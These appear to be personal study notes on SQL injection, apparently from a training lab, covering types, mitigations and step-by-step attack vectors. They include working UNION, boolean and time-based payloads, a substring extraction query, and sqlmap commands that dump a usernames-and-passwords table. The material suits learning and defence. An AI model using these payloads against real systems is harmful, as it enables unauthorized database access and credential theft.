### Overview
SQL injection is a common web application security vulnerability that occurs when an attacker can manipulate input data to execute unintended SQL queries against the application's database. It can lead to unauthorized access, data manipulation, and potentially complete compromise of the application and its underlying database.

The vulnerability arises when user-supplied input, such as form fields, URL parameters, or cookies, is not correctly validated, sanitized, or parameterized before being used in SQL queries. Attackers exploit this weakness by injecting malicious SQL code into the input fields, which the application then unwittingly executes, leading to various security risks.

#### Examples
Suppose we have a login form where users enter their username and password. The application uses the following SQL query to authenticate the user:
`SELECT * FROM users WHERE username = '<user_input_username>' AND password = '<user_input_password>';`
If the application does not properly validate or sanitize the input, an attacker could enter the following into the username field: `' OR '1'='1`

When the query is executed, it becomes:
`SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '<user_input_password>';`

Since `'1'='1'` is always true, this query would return all rows from the users table, effectively bypassing the login mechanism and allowing the attacker to log in without a valid username or password.

#### MariaDB Linux Commands
![[MariaDB Linux Commands.png]]

#### Mitigation
1. **Parameterized Queries:** Use parameterized queries (also known as prepared statements) with bound parameters to ensure that user input is properly separated from the SQL query.
2. **Input Validation and Sanitization:** Validate and sanitize user input to ensure it adheres to expected patterns and does not contain malicious content.
3. **Least Privilege:** Limit the database user's privileges to only those necessary for the application to function, reducing the potential damage an attacker can cause.
4. **Web Application Firewalls (WAFs):** Implement WAFs to filter and block malicious SQL injection attempts.
5. **Secure Development Practices:** Train developers to follow secure coding practices and regularly perform security testing, such as code reviews and penetration testing, to identify and fix vulnerabilities.

### SQL Injection Types
#### Overview
1. **In-Band SQLi (Classical):** This is the most common type of SQL injection. It occurs when an attacker can directly inject malicious SQL code into the application's input fields. The injected SQL is executed by the application, leading to unauthorized access or data manipulation. Classic SQL injection can be further divided into two subtypes:
	- **Error-Based SQL Injection:** The attacker exploits SQL errors generated by the application to gather information about the database structure and data.
	- **Union-Based SQL Injection:** The attacker uses the SQL `UNION` operator to combine results from different SQL queries, extracting data from the database.
2. **Blind SQL Injection:** In this type of SQL injection, the application's response does not directly reveal the results of the injected SQL query. The attacker needs to rely on true/false responses or time delays to infer the data indirectly. Blind SQL injection can be classified into two subtypes:
	- **Boolean-Based Blind SQL Injection:** The attacker exploits boolean-based responses (e.g., "True" or "False") to guess the data.
	- **Time-Based Blind SQL Injection:** This type of SQL injection relies on injecting malicious SQL code that causes time delays in the application's response. By measuring the time it takes for the application to respond, the attacker can infer whether the injected query returned true or false
3. **Out-of-Band SQL Injection:** Out-of-Band SQL injection occurs when the attacker can retrieve data from the database via a different communication channel than the application's response. This may involve DNS requests, HTTP requests, or other methods to transfer data.
4. **Second-Order SQL Injection:** Second-Order SQL injection occurs when user input is stored in the database but not immediately used in a SQL query. Later, when that input is retrieved from the database and used in a query without proper validation, an SQL injection vulnerability can be triggered.
5. **Stored (Persistent) SQL Injection:** In stored SQL injection, the malicious payload is permanently stored in the application's database (e.g., in comments or user profiles). When the vulnerable page is loaded, the payload is executed, causing the SQL injection.

#### UNION SQL Injection
##### Overview
Union-based SQL injection is a type of SQL injection attack that leverages the SQL `UNION` operator to combine the results of two or more SQL queries into a single result set. This technique is used when an application is vulnerable to SQL injection, and the attacker can inject malicious SQL code into an input field.

The `UNION` operator in SQL is used to combine the results of two or more SELECT queries into a single result set. The number of columns and their data types in each SELECT query must match for the `UNION` operation to be successful.

1. **Identifying Vulnerability:** The attacker identifies a vulnerable input field where the application does not properly validate or sanitize user input, allowing them to inject SQL code.
2. **Crafting the Payload:** The attacker crafts a malicious payload containing a valid SQL query that retrieves data. For example:
```sql
' UNION SELECT column1, column2 FROM table_name--
```
- The injected payload is appended to the original SQL query, and the double hyphen `--` signifies a comment in SQL, effectively commenting out the remaining part of the original query.
3. **Exploiting the UNION:** If the application is vulnerable and does not handle the injected input securely, the SQL injection attack will be successful, and the attacker's payload will be executed as part of the SQL query.  
4. **Data Retrieval:** The attacker's injected SQL query retrieves data from the specified columns and table (in this example, `column1` and `column2` from `table_name`).  
5. **Combining Results:** The retrieved data is combined with the results of the original query using the `UNION` operator, resulting in a single result set.  
6. **Data Leakage:** The attacker can now view the combined result set, which may contain sensitive information from the application's database.

It's important to note that the success of a Union-based SQL injection attack depends on the following conditions:
- The application must be vulnerable to SQL injection.
- The application must use dynamic SQL queries constructed using user-supplied input.
- The injected SQL query must produce the same number of columns and compatible data types as the original query to perform a successful `UNION`.

##### Attack Vector
1. **Identify Number of Parameters**
	```sql
	jeremy` UNION SELECT null #
	jeremy` UNION SELECT null, null#
	jeremy` UNION SELECT null, null, null# â†’ Returns a Result
	```
	- The 3 Nulls returns a result then the select statement uses 3 parameters
2. **Identify Parameters Datatypes**
	```sql
	jeremy` UNION SELECT 1, null, null#
	jeremy` UNION SELECT 1, "string", null#
	jeremy` UNION SELECT 1, bool, null#
	...
	```
3. **Obtaining DB Information**
	- Getting The Tables Names
	```sql
	jeremy` UNION SELECT null, null, version()#
	jeremy` UNION SELECT null, null, table_name from information_schema.tables#
	```
	- Getting The Columns Names
	```sql
	jeremy` UNION SELECT null, null, column_name from information_schema.columns#
	```
	- Getting Data From The Table
	```sql
	jeremy` UNION SELECT null, null, password from injection0x01#
	```

#### Blind SQL Injection
##### Overview
Blind SQL injection is a type of SQL injection attack where an attacker can exploit a vulnerability to inject malicious SQL code into an application's input fields, but the results of the injected SQL query are not directly visible in the application's response. Instead, the attacker must rely on the application's behavior to infer the success or failure of the injected SQL query.

Blind SQL injection attacks are usually encountered when the application filters or sanitizes the user input in such a way that the injected SQL code does not produce visible output in the application's response. As a result, the attacker cannot directly observe the results of the injected SQL query, making the attack more challenging but not impossible.

Blind SQL injection can be categorized into two main types:
1. **Boolean-Based Blind SQL Injection:** 
	- In this type of blind SQL injection, the attacker injects malicious SQL code that results in a condition that is either true or false. The application's response may vary depending on whether the injected condition evaluates to true or false. The attacker then uses this variation in the application's behavior to infer information about the database.
	```sql
	SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';
	```
	- If the attacker injects the following into the username field: `' OR 1=1--` The resulting query will be:
	```sql
	SELECT * FROM users WHERE username = '' OR 1=1-- AND password = 'input_password';
	```
	- If the application responds differently when the query returns any result (true) versus no result (false), the attacker can infer that the injected condition `' OR 1=1--` evaluates to true, and they can use this to bypass authentication.
2. **Time-Based Blind SQL Injection:** 
	- In this type of blind SQL injection, the attacker injects malicious SQL code that causes time delays in the application's response. The attacker then observes the response time to determine whether the injected condition is true or false.
	```sql
	SELECT * FROM products WHERE product_id = 'input_product_id';
	```
	- If the attacker injects the following into the product_id field: `' OR IF(1=1, SLEEP(5), 0)--` The resulting query will be:
	```sql
	SELECT * FROM products WHERE product_id = '' OR IF(1=1, SLEEP(5), 0)--;
	```
	- If the application delays the response by approximately 5 seconds when the injected condition `' OR IF(1=1, SLEEP(5), 0)--` is true, the attacker can infer that the condition is true.

##### Attack Vector
1. **Look For The Injectable Parameter**
2. **Look For 2 Conditional Inputs, 1 that returns true and another returns false**
3. **Try Testing for Injection**: `' or 1=1`
4. **Injection Process**:
```sql
True Input` and substring(SELECT password FROM injection0x01 WHERE username='jessamy', 1, 1) = 'a'# 
```
5. **Automate the Process on the Intruder**:
![[Intruder Payload Positions.png]]
First set the positions for the payload in the request
![[Intruder Set Payload.png]]
Second enter a simple list of characters to be replaced by the placeholder
![[Finding the Match.png]]
Third sort by length of filter to see the success result (In this example the 'z')

##### Using SQL Map
1. **Copy the request and paste it in a file.txt**
	```bash
	$ sqlmap -r file.txt --level=2
	```
	- This will show if the parameter is injectable or not
	- This will also show you some payload example to exploit the vulnerability
2. **Dump the Values**
	```bash
	$ sql map -r file.txt --level=2 --dump -T injection0x02
	```
	- This will dump the data from the injection0x02 table (usernames & passwords)


